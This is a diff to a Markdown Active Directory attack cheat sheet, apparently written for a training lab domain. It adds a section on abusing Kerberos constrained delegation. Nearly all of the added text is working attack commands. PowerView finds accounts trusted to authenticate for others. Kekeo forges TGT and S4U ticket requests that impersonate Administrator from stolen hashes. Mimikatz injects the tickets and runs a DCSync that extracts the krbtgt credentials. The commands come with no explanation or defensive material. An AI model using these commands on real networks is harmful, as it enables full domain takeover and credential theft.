@@ -31,6 +31,7 @@
    * [AS-REPS](#AS-REPS) 
    * [Set SPN](#Set-SPN) 
    * [Unconstrained Delegation](#Unconstrained-delegation) 
+   * [Constrained Delegation](#Constrained-delegation) 
       
 
 # General
@@ -833,32 +834,46 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 Invoke-Mimikatz -Command '"Kerberos:ptt"' <kirbi file>
 ```
 
-####
+## Constrained Delegation
+#### Enumerate users with contrained delegation enables
+```
+Get-DomainUser -TrustedToAuth
 ```
 
+#### Enumerate computers with contrained delegation enables
+```
+Get-Domaincomputer -TrustedToAuth
+Get-Domaincomputer -TrustedToAuth
 ```
 
-####
+#### Requesting TGT with kekeo
+```
+./kekeo.exe
+Tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<hash>
 ```
 
+#### Requesting TGS with kekeo
+```
+Tgs::s4u /tgt:<tgt> /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
 ```
 
-####
+#### Use Mimikatz to inject the TGS ticket
+```
+Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
 
+#### Requesting TGT with a PC hash
+```
+Tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:<hash>
 ```
 
-####
+#### Requesting TGS
+```
+Tgs::s4u /tgt:<kirbi file> /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL | ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
 ```
 
+#### Using mimikatz to inject TGS ticket and executing DCsync
 ```
-
-####
-```
-
-```
-
-####
-```
-
+Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
